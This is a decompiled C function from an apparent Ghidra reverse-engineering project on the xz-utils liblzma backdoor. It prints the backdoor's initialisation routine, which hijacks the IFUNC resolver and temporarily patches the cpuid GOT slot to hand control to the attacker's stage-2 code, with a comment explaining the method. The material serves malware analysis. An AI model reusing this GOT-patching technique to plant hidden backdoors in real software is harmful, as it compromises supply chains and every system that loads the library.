// /home/kali/xzre-ghidra/xzregh/10A794_backdoor_init.c
// Function: backdoor_init @ 0x10A794
// Calling convention: __stdcall
// Prototype: void * __stdcall backdoor_init(elf_entry_ctx_t * state, u64 * caller_frame)


/*
 * AutoDoc: Converts the IFUNC entry context into a GOT patch: it initialises the GOT bookkeeping, locates the cpuid GOT slot via
 * `update_got_address`, swaps the resolver pointer to `backdoor_init_stage2`, calls the genuine cpuid to finish initialisation,
 * and then restores the slot back to its original target so future calls run the attacker’s resolver without tripping sanity
 * checks.
 */

#include "xzre_types.h"

void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)

{
  long original_target;
  undefined *reloc_consts;
  void *got_base;
  long *got_slot;
  
  (state->got_ctx).got_offset = (ptrdiff_t)state;
  init_elf_entry_ctx(state);
  reloc_consts = PTR__Llzma_block_buffer_decode_0_0010e000;
  state->frame_address = (u64 *)(state->got_ctx).return_address;
  got_base = (void *)((long)state->symbol_ptr - (state->got_ctx).got_offset);
  (state->got_ctx).got_ptr = got_base;
  got_slot = (long *)((long)got_base + *(long *)(reloc_consts + 8));
  (state->got_ctx).return_address = got_slot;
  if (got_slot != (long *)0x0) {
    original_target = *got_slot;
    *got_slot = (long)got_base + *(long *)(reloc_consts + 0x10);
    got_base = (void *)(*(code *)PTR__cpuid_gcc_0010e008)();
    *got_slot = original_target;
  }
  return got_base;
}

